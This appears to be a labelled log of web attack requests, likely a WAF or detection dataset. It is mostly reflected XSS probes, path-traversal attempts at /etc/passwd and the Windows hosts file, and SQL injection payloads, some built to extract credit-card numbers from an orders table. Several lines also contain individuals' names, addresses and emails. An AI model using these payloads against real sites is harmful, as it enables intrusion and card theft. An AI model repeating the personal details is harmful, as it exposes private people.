+attack:5  /Scripts/customjsbundle?<script>alert('TK00000121')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E8')</script>
+attack:6  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000015')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000099')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000063')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000071')</script>
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Diana&sln=Rivera&sa1=PO Box 904&sa2=&sc=Utuado&ss=PR&sz=00641&se=dirn_14@hotmail.com&models=3592,&t==dHFpd2Fmc2htN0tFVmxwTVQwa"\x01"ZG9ady9DQlZlcW8=
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Shawn&sln=Fordyce&sa1=3222 keays Ave &sa2=&sc=Middletown &ss=OH&sz=45044&se=Shawn.fordyce.3@gmail.com&models=67,&t==WjRRR3VQdFRqQUV6WHZMTzVqa"\v"LzNoMFc1cFFia0s=
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001A')</script>
+attack:5  /Campaign/Account/Register?ReturnUrl=/campaign/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EA')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK0000010A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B6')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000127')</script>
+attack:5  /campaign/home/switchview?mobile=false&amp;returnurl=/campaign/
+attack:5  /include/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000049')</script>
+attack:5  /exchweb/bin/auth/owalogin.asp
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F9')</script>
+attack:5  /lib/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000128')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003B')</script>
+attack:5  /campaign/home/code
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000058')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000026')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E4')</script>
+attack:5  /Error/NotFound?../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts 
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FD')</script>
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C4')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000057')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000091')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000087')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F7')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000107')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CF')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using utf8)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Nut/home/Code
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A6')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK00000119')</script>
+attack:5  /system/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000072')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000060')</script>
+attack:5  /Campaign/Error/NotFound?aspxerrorpath=/campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000016')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CC')</script>
+attack:5  /Campaign/Account/Register?ReturnUrl=/Campaign/home/Index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000045')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000034')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000097')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000010')</script>
+attack:5  /campaign/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000059')</script>
+attack:5  /twiki/bin/view/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000088')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000068')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000095')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B2')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK00000110')</script>
+attack:5  /root/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000106')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BF')</script>
+attack:5  /campaign/home/find
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008F')</script>
+attack:5  /lib/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000070')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000086')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000062')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000065')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000096')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000027')</script>
+attack:5  /rebates/details.php?partnerid=blbrb00001/system/fckeditor/editor/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006A')</script>
+attack:5  /nut/home/detail/2073
+attack:5  /etc/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BC')</script>
+attack:6  /Express/default.aspx?partnerId=REDACTEDSTSP00001&sfn=Sharon&sln=Gottschalk&sa1=South 926 U.S. Hwy 41&sa2=&sc=Stephenson&ss=MI&sz=49887&se=sgottschalk75@hotmail.com&t==a1NodFJlejllQXdZcitjV"^"HZDTllIVm04QTJneDQ=
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000077')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000041')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT uncompress(compress(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!")))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DF')</script>
+attack:5  /Campaign/home/Index
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Jo./Nate&sln=Simmons&sa1=1604 east Aberdeen&sa2=&sc=Muskogee&ss=OK&sz=74401&se=tillygreen682@yahoo.com&models=11TC,&t==VnZ6YUplR2VsYWNrNmpHU2laZEhCdGhybWEvOC8vSjc=
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000074')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000042')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F5')</script>
+attack:5  /WEB-INF./web.xml
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A2')</script>
+attack:6  /corporate_info.php?content=corp_mgt' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000030')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B5')</script>
+attack:5  /campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:6  /corporate_info.php?content=corp_mgt or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000039')</script>
+attack:7  /corporate_info.php?content=corp_mgt" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000056')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../../WINDOWS\system32\drivers\etc\hosts
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000022')</script>
+attack:5  /usr/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000040')</script>
+attack:5  /$.extend({},
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E9')</script>
+attack:5  /campaign/home/contact
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000012')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002B')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000105')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003C')</script>
+attack:5  /WINDOWS/system32/drivers/etc/hosts
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000051')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DB')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK00000109')</script>
+attack:5  /admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000115')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000081')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000A')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000006')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000035')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000052')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000038')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000019')</script>
+attack:5  /Error/NotFound?././././././././././/etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005E')</script>
+attack:5  /sys/
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=reagan&sln=Castillo&sa1=27621 Villa Ave&sa2=&sc=Highland&ss=CA&sz=92346&se=reagancastillo123@gmail.com&models=4496,&t=VvzaJeGelad06Uts8jY"\f"gqBBMHLvqn
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000E')</script>
+attack:5  /exchweb/bin/auth/owalogon.asp
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AB')</script>
+attack:5  /conf/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000055')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000061')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000023')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000050')</script>
+attack:5  /exchweb/bin/auth/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000092')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnVeRt(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!") using latin1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D0')</script>
+attack:5  /nut/home/campaignexpired
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000009')</script>
+attack:5  /Home/Index?<script>alert('TK0000012A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000ED')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E5')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT binary(/**/cOnCaT("!~!",/**/vErSiOn(),"!~!"))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000078')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000125')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000080')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000064')</script>
+attack:5  /campaign/home/terms
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000054')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000093')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C0')</script>
+attack:6  /product_info.php?keywords=fast&products_id=3724&skus_id=94331' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT("!~!",/**/vErSiOn(),"!~!")) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&location=advanced_search_result
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000073')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000083')</script>
+attack:5  /Error/NotFound?../../../../../../../../../..//etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000047')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B7')</script>
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000037')</script>
+attack:6  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000031')</script>
+attack:5  /Error/NotFound?././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F6')</script>
+attack:5  /includes/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /bin/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DC')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010F')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010E')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000111')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././/etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=../../../../../../../../../..//etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000029')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000036')</script>
+attack:5  /windows/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000028')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B1')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000112')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000B')</script>
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="y
+attack:7  /corporate_info.php?content=corp_mgt" and "x"="x
+attack:5  /Content/css/cssbundle?<script>alert('TK00000101')</script>
+attack:5  /dev/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000066')</script>
+attack:5  /Error/NotFound?aspxerrorpath=././././././././././WINDOWS\system32\drivers\etc\hosts
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000067')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000118')</script>
+attack:5  /boot/
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000011')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000102')</script>
+attack:5  /etc/passwd
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E7')</script>
+attack:5  /Express/default.aspx?partnerId=REDACTEDP00001&sfn=Velma&sln=Charles&sa1=503 FONTELIEU DRIVE&sa2=&sc=New Iberia&ss=LA&sz=70560&se=vmarie2524@yahoo.com&models=5387,3592,&t==QVRDWERMWmVUeGVFVmxwTVQwa"\x01"U2RrRS8yWkZ6TEU=
+============================================
